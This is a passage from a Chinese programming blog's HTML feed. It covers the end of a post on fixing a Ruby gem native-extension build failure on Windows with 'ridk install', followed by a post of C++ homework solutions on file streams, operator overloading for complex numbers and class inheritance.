C:/Ruby26-x64/lib/ruby/gems/2.6.0/gems/http_parser.rb-0.6.0/ext/ruby_http_parser                                                                     </span><br><span class="line">C:/Ruby26-x64/bin/ruby.exe -I C:/Ruby26-x64/lib/ruby/2.6.0 -r ./siteconf20200725-11868-qpbmqf.rb extconf.rb  </span><br><span class="line">creating Makefile                                                                                                                                                        </span><br><span class="line">current directory: C:/Ruby26-x64/lib/ruby/gems/2.6.0/gems/http_parser.rb-0.6.0/ext/ruby_http_parser                                                                         </span><br><span class="line">make <span class="string">"DESTDIR="</span> clean                                                                                                                                                       </span><br><span class="line">current directory: C:/Ruby26-x64/lib/ruby/gems/2.6.0/gems/http_parser.rb-0.6.0/ext/ruby_http_parser                                                                         </span><br><span class="line">make <span class="string">"DESTDIR="</span>                                                                                                                                                             </span><br><span class="line">make failedNo such file or directory - make <span class="string">"DESTDIR="</span>                                                                                                                                                                                                                                                                                                  </span><br><span class="line">Gem files will remain installed <span class="keyword">in</span> C:/Ruby26-x64/lib/ruby/gems/2.6.0/gems/http_parser.rb-0.6.0 <span class="keyword">for</span> inspection.                                                              </span><br><span class="line">Results logged to C:/Ruby26-x64/lib/ruby/gems/2.6.0/extensions/x64-</span><br><span class="line">mingw32/2.6.0/http_parser.rb-0.6.0/gem_make.out </span><br></pre></td></tr></tbody></table></figure><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>输入ridk install，安装MSYS2 and MINGW development toolchain<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1223/20200725105324259.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Windows </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>c++作业</title>
      
      
      <link href="/cn/posts/43139/"/>
      
      
      <url>/cn/posts/43139/</url>
      
      
        
      <content type="html"><![CDATA[<h1 id="输入输出流与文件操作"><a href="#输入输出流与文件操作" class="headerlink" title="输入输出流与文件操作"></a>输入输出流与文件操作</h1><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//职工</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Person</span></span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> m_Id;</span><br><span class="line">&nbsp; &nbsp; string m_Name;</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> m_Age;</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> m_Wage;</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; <span class="built_in">Person</span>(<span class="type">int</span> i, string n, <span class="type">int</span> a, <span class="type">int</span> w): <span class="built_in">m_Id</span>(i), <span class="built_in">m_Name</span>(n), <span class="built_in">m_Age</span>(a), <span class="built_in">m_Wage</span>(w) { }</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">PrintInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; <span class="string">"==================="</span> &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; <span class="string">"号码:\t"</span> &lt;&lt; <span class="keyword">this</span> -&gt; m_Id &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; <span class="string">"名字:\t"</span> &lt;&lt; <span class="keyword">this</span> -&gt; m_Name &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; <span class="string">"年龄:\t"</span> &lt;&lt; <span class="keyword">this</span> -&gt; m_Age &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; <span class="string">"工资:\t"</span> &lt;&lt; <span class="keyword">this</span> -&gt; m_Wage &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; <span class="string">"==================="</span> &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">Person *p[<span class="number">3</span>] =</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">new</span> <span class="built_in">Person</span>(<span class="number">101</span>, <span class="string">"小黄"</span>, <span class="number">23</span>, <span class="number">3100</span>),</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">new</span> <span class="built_in">Person</span>(<span class="number">102</span>, <span class="string">"中黄"</span>, <span class="number">41</span>, <span class="number">6600</span>),</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">new</span> <span class="built_in">Person</span>(<span class="number">105</span>, <span class="string">"大黄"</span>, <span class="number">55</span>, <span class="number">7000</span>),</span><br><span class="line"></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">&nbsp; &nbsp; <span class="comment">//对5组数据按ID进行排序</span></span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> i, j;</span><br><span class="line">&nbsp; &nbsp; Person *temp;</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">for</span>(j = i + <span class="number">1</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">if</span>(p[i] -&gt; m_Id &gt; p[j] -&gt; m_Id)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; temp = p[i];</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p[i] = p[j];</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p[j] = temp;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; <span class="comment">//将排好序的数据存入到文件f.dat</span></span><br><span class="line">&nbsp; &nbsp; <span class="function">ofstream <span class="title">outfile1</span><span class="params">(<span class="string">"f.dat"</span>, ios :: out)</span></span>;</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">if</span>(!outfile1)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cerr &lt;&lt; <span class="string">"f.dat 打开错误"</span> &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; outfile1 &lt;&lt; p[i] -&gt; m_Id &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; p[i] -&gt; m_Name &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; p[i] -&gt; m_Age &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; p[i] -&gt; m_Wage &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; outfile<span class="number">1.</span><span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; <span class="comment">//再写入两个职工信息</span></span><br><span class="line">&nbsp; &nbsp; <span class="comment">//示例输入 108 Titus 40 4000 109 Tulius 35 5000</span></span><br><span class="line">&nbsp; &nbsp; cout &lt;&lt; <span class="string">"请输入2个职工信息："</span>;</span><br><span class="line">&nbsp; &nbsp; <span class="function">ofstream <span class="title">outfile2</span><span class="params">(<span class="string">"f.dat"</span>, ios :: out | ios :: app)</span></span>;</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">if</span>(!outfile2)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cerr &lt;&lt; <span class="string">"f.dat 打开错误"</span> &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; temp = <span class="keyword">new</span> <span class="built_in">Person</span>(<span class="number">0</span>, <span class="string">""</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&nbsp; &nbsp; cin &gt;&gt; temp -&gt; m_Id &gt;&gt; temp -&gt; m_Name &gt;&gt; temp -&gt; m_Age &gt;&gt; temp -&gt; m_Wage;</span><br><span class="line">&nbsp; &nbsp; outfile2 &lt;&lt; temp -&gt; m_Id &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Name &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Age &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Wage &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; cin &gt;&gt; temp -&gt; m_Id &gt;&gt; temp -&gt; m_Name &gt;&gt; temp -&gt; m_Age &gt;&gt; temp -&gt; m_Wage;</span><br><span class="line">&nbsp; &nbsp; outfile2 &lt;&lt; temp -&gt; m_Id &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Name &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Age &lt;&lt; <span class="string">" "</span></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Wage &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; outfile<span class="number">2.</span><span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; <span class="comment">//输出文件中的全部职工数据</span></span><br><span class="line">&nbsp; &nbsp; <span class="function">ifstream <span class="title">infile1</span><span class="params">(<span class="string">"f.dat"</span>, ios :: in)</span></span>;</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">if</span>(!infile1)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cerr &lt;&lt; <span class="string">"f.dat 打开错误"</span> &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; infile1 &gt;&gt; temp -&gt; m_Id &gt;&gt; temp -&gt; m_Name &gt;&gt; temp -&gt; m_Age &gt;&gt; temp -&gt; m_Wage;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; temp -&gt; <span class="built_in">PrintInfo</span>();</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; infile<span class="number">1.</span><span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; <span class="comment">//输入一个ID检测是否存在</span></span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> id;</span><br><span class="line">&nbsp; &nbsp; cout &lt;&lt; <span class="string">"请输入一个号码："</span>;</span><br><span class="line">&nbsp; &nbsp; cin &gt;&gt; id;</span><br><span class="line">&nbsp; &nbsp; <span class="type">bool</span> isFound = <span class="literal">false</span>;</span><br><span class="line">&nbsp; &nbsp; <span class="function">ifstream <span class="title">infile2</span><span class="params">(<span class="string">"f.dat"</span>, ios :: in)</span></span>;</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">if</span>(!infile2)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cerr &lt;&lt; <span class="string">"f.dat 打开错误"</span> &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; infile2 &gt;&gt; temp -&gt; m_Id &gt;&gt; temp -&gt; m_Name &gt;&gt; temp -&gt; m_Age &gt;&gt; temp -&gt; m_Wage;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">if</span>(temp -&gt; m_Id == id)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; temp -&gt; <span class="built_in">PrintInfo</span>();</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; isFound = <span class="literal">true</span>;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">break</span>;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">if</span>(!isFound)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cerr &lt;&lt; <span class="string">"没有找到这个人"</span> &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; infile<span class="number">2.</span><span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="类和对象的进阶"><a href="#类和对象的进阶" class="headerlink" title="类和对象的进阶"></a>类和对象的进阶</h1><ol><li>定义一个复数类，重载运算符“+”、“-”、“<em>”、“/”，使这四个运算符能应用于复数的加减乘除运算。 复数加法：m=a+bi ,n=c+di; m+n=(a+c)+(b+d)i; 复数减法：m=a+bi ,n=c+di; m-n=(a-c)+(b-d)i; 复数乘法：m=a+bi ,n=c+di; m</em>n=(ac-bd)+(bc+ad)i;<br>复数除法：m=a+bi ,n=c+di; m/n=((ac+bd)+(bc-ad)i)/(c2+d2)。</li><li>参考教材例题11.1,11.2,11.3,11.5，分别采用公有继承，私有继承和保护继承的方式，在程序运行中，输入num，name,sex,age,addr的值，程序应输出以上五个数据的数值；</li><li>3.将教材例9.13中的Time类声明为Date的友元类，输出年月日和时分秒。</li></ol><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="built_in">Complex</span>(<span class="type">double</span> x = <span class="number">0</span>, <span class="type">double</span> y = <span class="number">0</span>) :<span class="built_in">real</span>(x), <span class="built_in">imag</span>(y) {}</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">friend</span> Complex <span class="keyword">operator</span> * (Complex &amp;m, Complex &amp;n);</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">friend</span> Complex <span class="keyword">operator</span> / (Complex &amp;m, Complex &amp;n);</span><br><span class="line">&nbsp; &nbsp; Complex <span class="keyword">operator</span> + (Complex &amp;n);</span><br><span class="line">&nbsp; &nbsp; Complex <span class="keyword">operator</span> - (Complex &amp;n);</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="type">double</span> real;</span><br><span class="line">&nbsp; &nbsp; <span class="type">double</span> imag;</span><br><span class="line">};</span><br><span class="line">Complex <span class="keyword">operator</span> * (Complex &amp;m, Complex &amp;n)</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">return</span> <span class="built_in">Complex</span>(m.real*n.real - m.imag*n.imag, m.real*n.imag + m.imag*n.real);</span><br><span class="line">}</span><br><span class="line">Complex <span class="keyword">operator</span> / (Complex &amp;m, Complex &amp;n)</span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; Complex c;</span><br><span class="line">&nbsp; &nbsp; c.real = (m.real*n.real + m.imag*n.imag) / (n.real*n.real + n.imag*n.imag);</span><br><span class="line">&nbsp; &nbsp; c.imag = (m.imag*n.real - m.real*n.imag) / (n.real*n.real + n.imag*n.imag);</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">return</span> c;</span><br><span class="line">}</span><br><span class="line">Complex &nbsp;Complex ::<span class="keyword">operator</span> + (Complex &amp;n)</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">return</span> <span class="built_in">Complex</span>(real + n.real, imag + n.imag);</span><br><span class="line">}</span><br><span class="line">Complex &nbsp;Complex ::<span class="keyword">operator</span> - (Complex &amp;n)</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">return</span> <span class="built_in">Complex</span>(real - n.real, imag - n.imag);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Complex::display</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">&nbsp; &nbsp; cout &lt;&lt; <span class="string">"&lt;"</span> &lt;&lt; real &lt;&lt; <span class="string">","</span> &lt;&lt; imag &lt;&lt; <span class="string">"i&gt;"</span> &lt;&lt; endl;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> a,bi,c,di;</span><br><span class="line">&nbsp; &nbsp; cout&lt;&lt;<span class="string">"请输入m的实部和虚部"</span>&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; cin&gt;&gt;a&gt;&gt;bi;</span><br><span class="line">&nbsp; &nbsp; cout&lt;&lt;<span class="string">"请输入n的实部和虚部"</span>&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; cin&gt;&gt;c&gt;&gt;di;</span><br><span class="line">&nbsp; &nbsp; <span class="function">Complex <span class="title">m</span><span class="params">(a, bi)</span>, <span class="title">n</span><span class="params">(c, di)</span>, c3</span>;</span><br><span class="line">&nbsp; &nbsp; cout&lt;&lt;<span class="string">"为"</span>&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; m.<span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; cout&lt;&lt;<span class="string">"n为"</span>&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; n.<span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; cout&lt;&lt;<span class="string">"计算结果为"</span>&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; c3 = m + n;</span><br><span class="line">&nbsp; &nbsp; c<span class="number">3.</span><span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; c3 = m - n;</span><br><span class="line">&nbsp; &nbsp; c<span class="number">3.</span><span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; c3 = m * n;</span><br><span class="line">&nbsp; &nbsp; c<span class="number">3.</span><span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; c3 = m / n;</span><br><span class="line">&nbsp; &nbsp; c<span class="number">3.</span><span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">get_value</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cin&gt;&gt;num&gt;&gt;name&gt;&gt;sex;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">( )</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"num: "</span>&lt;&lt;num&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"name: "</span>&lt;&lt;name&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; 